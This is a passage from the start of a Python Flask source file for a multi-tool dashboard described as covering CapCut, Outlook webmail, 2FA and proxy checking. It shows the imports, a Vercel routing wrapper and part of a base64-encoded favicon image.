"""ChenStore Multi Tools Dashboard: CapCut, Outlook Webmail, 2FA & Proxy Checker.
Self-contained single file for Vercel Serverless Function deployment.
"""
import json
import os
import re
import random
import string
import datetime
import hmac
import hashlib
import base64
import struct
import time
import ipaddress
from datetime import timezone
from typing import Dict, Any, Tuple, Optional, List
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote, unquote, urlsplit
from html.parser import HTMLParser
from flask import Flask, Response, render_template_string, request, jsonify, send_from_directory
import requests

app = Flask(__name__)

# Fix Vercel Serverless PATH_INFO rewrite
class VercelWSGIHandler:
    def __init__(self, flask_app):
        self.app = flask_app

    def __call__(self, environ, start_response):
        path = environ.get('PATH_INFO', '')
        if path == '/api/index.py' or path == '/api/index':
            # Preserve original request path if passed via headers or default to /
            orig_uri = environ.get('HTTP_X_NOW_ROUTE', '') or environ.get('HTTP_X_VERCEL_PATH', '') or '/'
            if '?' in orig_uri:
                orig_uri = orig_uri.split('?')[0]
            environ['PATH_INFO'] = orig_uri
        return self.app(environ, start_response)

handler = VercelWSGIHandler(app)


FAVICON_B64 = "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